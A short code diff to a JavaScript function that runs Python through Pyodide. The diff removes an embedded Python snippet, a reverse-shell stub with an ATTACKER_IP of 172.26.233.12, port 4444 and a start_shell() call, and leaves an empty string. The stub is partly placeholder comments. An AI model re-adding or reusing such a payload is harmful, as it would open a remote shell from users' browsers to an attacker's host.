@@ -7,15 +7,7 @@ async function executeCommand() {
     try {
         // 1. Execute the function/script defined in the Python payload string
         // We pass the input data to the Python context.
-        const pythonCodeToRun = `
-import socket
-# ... (Paste the full connection logic here or define a function) ...
-ATTACKER_IP = "172.26.233.12"
-PORT = 4444
-# ... (rest of the payload logic) ...
-# Call the function that encapsulates the connection attempt
-print(start_shell()) 
-`;
+        const pythonCodeToRun = ``;
 
         // Execute the code string using pyodide
         const result = await window.pyodide.runPythonAsync(pythonCodeToRun);
